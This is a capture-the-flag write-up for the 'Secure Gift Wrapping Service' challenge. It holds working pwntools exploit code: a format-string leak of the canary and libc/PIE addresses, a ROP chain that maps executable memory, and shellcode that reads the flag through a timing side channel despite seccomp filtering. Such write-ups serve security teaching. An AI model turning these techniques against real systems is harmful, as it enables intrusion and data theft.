# 22 - Secure Gift Wrapping Service

## Description

Level: Leet<br/>
Author: darkice

This year, a new service has been launched to support the elves in wrapping gifts. Due to a number of stolen gifts in
recent days, increased security measures have been introduced and the gifts are being stored in a secret place. As
Christmas is getting closer, the elves need to load the gifts onto the sleigh, but they can't find them. The only hint
to this secret place was probably also packed in one of these gifts. Can you take a look at the service and see if you
can find the secret?

## Solution

This was probably my favourite challenge this year but also the one that took the longest to solve. We are
given [public.tar.xz](public.tar.xz) that contains the binary as well as the remote libc.

First things first, I check the security properties:

```console
$ pwn checksec pwn

    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

We can see that all security mechanisms are enabled. Next, I open the binary in Ghidra and do some reversing to get:

```c
void main() {
  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);
  
  puts("Welcome to the secure gift wrapping service!\n");
  printf("Who should the gifts be for? ");
  
  char name[264];
  fgets(name, 20, stdin);
  
  printf("Processing the wishes of ");
  printf(name); // string format vulnerability
  
  for (int i = 0; i < 5; i++) {
    printf("\nName a wish: ");
    fgets(name, 512, stdin);
    strncpy(&gifts + i * 32, name, 256);
    puts("Succesfully wrapped the gift!");
  }
  
  puts("\nAll gifts were wrapped and will be stored securely in a secret place ...");
  scmp_filter_ctx ctx = seccomp_init(0);
  seccomp_rule_add(ctx, 0x7fff0000, 0x3c, 0);  // exit
  seccomp_rule_add(ctx, 0x7fff0000, 0xe7, 0);  // exit_group
  seccomp_rule_add(ctx, 0x7fff0000, 0, 0);     // read
  seccomp_rule_add(ctx, 0x7fff0000, 2, 0);     // open
  seccomp_rule_add(ctx, 0x7fff0000, 0x101, 0); // openat
  seccomp_rule_add(ctx, 0x7fff0000, 9, 0);     // mmap
  seccomp_rule_add(ctx, 0x7fff0000, 3, 0);     // close
  seccomp_load(ctx);
  seccomp_release(ctx);
  
  FILE *secret = open("secret.txt", O_RDONLY);
  read(secret, &flag, 0x100);
  close(secret);
  secret = rand();
  
  byte* secret_location = mmap(secret * 4096, 4096, PROT_READ | PROT_WIRTE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
  *secret_location = gifts;
  secret_location[191] = 0;
  
  rest = secret_location % 8;
  current = &gifts - rest;
  secret_location = (secret_location + 1) & 0xfffffffffffffff8; // align to the nearest multiple of 8

  for (int j = rest + 192; j != 0; j--) {
    *secret_location = *current;
    current++;
    secret_location++;
  }
  
  memset(&gifts, 0, 1536);
}
```

The code is pretty straight-forward:

- We can enter our name which then gets printed via `printf`, a format string vulnerability
- 5 gifts (strings) are read to the `gifts` location. Here we can perform a buffer overflow.
- [Seccomp](https://en.wikipedia.org/wiki/Seccomp) rules are added to only allow syscalls
  to `exit, exit_group, read, open, openat, mmap, close`
- The flag is read from file to memory
- Finally, our gifts are copied to a secret location

The seccomp rules are quite restrictive but if we can get a ROP chain to work, we should be able to use `mmap` to
allocate some executable memory to which we can then write some shellcode. Using the shellcode we can bypass the seccomp
rules by leaking the flag using [a trick I found here](https://n132.github.io/2022/07/03/Guide-of-Seccomp-in-CTF.html):

```assembly
	lea rax,[buf]
	xor rbx,rbx
	mov rbx, byte ptr[buf]
	cmp rbx, 0x30
INFI_LOOP:
	je INFI_LOOP
	hlt
```

The idea is that we can make the program loop indefinitely if we encounter the right flag character. Otherwise, the
program will terminate properly. This timing difference allows us to leak the flag character by character. In
retrospect, it would have been more efficient to leak the flag bit by bit to save some roundtrips (8 requests per
character instead of ~100 requests to go through `strings.printable`).

To get a ROP chain executed, we first have to leak the stack cookie, some libc address and some address of the binary.
Luckily we have a string format to do exactly that:

```python
io = start()
io.recvuntil(b'for?')

io.sendline(b"%43$p %45$p %47$p")
io.recvuntil(b"of ")
leaks = io.recvline().decode().split(' ')

cookie_leak = int(leaks[0], 16)
libc_leak = int(leaks[1], 16)
main_leak = int(leaks[2][:-1], 16)

exe.address = main_leak - exe.sym['main']
libc.address = libc_leak - 0x29d90
```

Next, we add 4 dummy gifts and perform a stack overflow on the last gift. The ROP chain performs the `mmap` as well as a
call to `read` to read in the second stage payload (shellcode):

```python
for i in range(4):
    io.recvuntil(b'wish: ')
    io.sendline(b'a')

io.recvuntil(b'wish: ')

rop = ROP(libc)
bss = exe.bss(20)
shell = 0x10000

rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(bss)

# sets r9 = 0
rop.raw(libc.address + 0x0000000000054d69)

rop.raw(rop.find_gadget(['pop rdi', 'ret']))
rop.raw(shell)

rop.raw(rop.find_gadget(['pop rsi', 'ret']))
rop.raw(300)

rop.raw(rop.find_gadget(['pop rcx', 'ret']))
rop.raw(34)  # flags set to MAP_ANONYMOUS | MAP_PRIVATE

rop.raw(rop.find_gadget(['pop rdx', 'ret']))
rop.raw(7)  # protection set to PROT_READ | PROT_WRITE | PROT_EXEC

rop.raw(libc.sym['mmap'])
rop.read(0, shell, 100)  # read shellcode from stdin
rop.raw(shell)

io.sendline(fit({264: cookie_leak, 280: rop.chain()}))
```

To get the R9 register (`offset` parameter of `mmap`) set to 0, I had to
use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to find an appropriate gadget. Now, we can finally load our
shell code to leak the byte:

```python
file_name = exe.address + 0x000020ea
data_segment = exe.bss(20)

sc = asm(f"""
    mov rdi, {hex(file_name)}
    xor rsi, rsi # O_RDONLY
    xor rdx, rdx
    mov rax, 2 # open
    syscall
    
    mov rdi, rax
    mov rsi, {hex(data_segment)}
    mov rdx, 0x30
    xor rax, rax # read
    syscall
    
    mov rsi, {hex(data_segment)}
    add rsi, {offset}
    xor rax, rax
    mov al, {hex(ord(current))}
    mov bl, [rsi]
    cmp al, bl
    
    je L2
    jmp done
    L2:
    nop
    jmp L2
    done:
    nop""")
io.sendline(sc)

start = time.time()
io.recvall(timeout=5)

if (time.time() - start > 5):
    print(current)
io.close()
```

The shellcode does something like this:

```c
file = open(flag, O_RDONLY)
read(file, bss, 0x30)

while (bss[offset] == current) {}
```

If we get the right flag character at `offset` then we simply enter an infinite loop.
With this we are able to leak the flag:

```
HV23{t
HV23{t1
HV23{t1m
HV23{t1m3
HV23{t1m3_
HV23{t1m3_b
HV23{t1m3_b4
HV23{t1m3_b4s
HV23{t1m3_b4s3
HV23{t1m3_b4s3d
HV23{t1m3_b4s3d_
HV23{t1m3_b4s3d_s
HV23{t1m3_b4s3d_s3
HV23{t1m3_b4s3d_s3c
HV23{t1m3_b4s3d_s3cr
HV23{t1m3_b4s3d_s3cr3
HV23{t1m3_b4s3d_s3cr3t
HV23{t1m3_b4s3d_s3cr3t_
HV23{t1m3_b4s3d_s3cr3t_e
HV23{t1m3_b4s3d_s3cr3t_ex
HV23{t1m3_b4s3d_s3cr3t_exf
HV23{t1m3_b4s3d_s3cr3t_exf1
HV23{t1m3_b4s3d_s3cr3t_exf1l
HV23{t1m3_b4s3d_s3cr3t_exf1lt
HV23{t1m3_b4s3d_s3cr3t_exf1ltr
HV23{t1m3_b4s3d_s3cr3t_exf1ltr4
HV23{t1m3_b4s3d_s3cr3t_exf1ltr4t
HV23{t1m3_b4s3d_s3cr3t_exf1ltr4t1
HV23{t1m3_b4s3d_s3cr3t_exf1ltr4t10
HV23{t1m3_b4s3d_s3cr3t_exf1ltr4t10n
HV23{t1m3_b4s3d_s3cr3t_exf1ltr4t10n}
```

Awesome challenge! The complete and hacky solution can be found in [exploit.py](exploit.py).
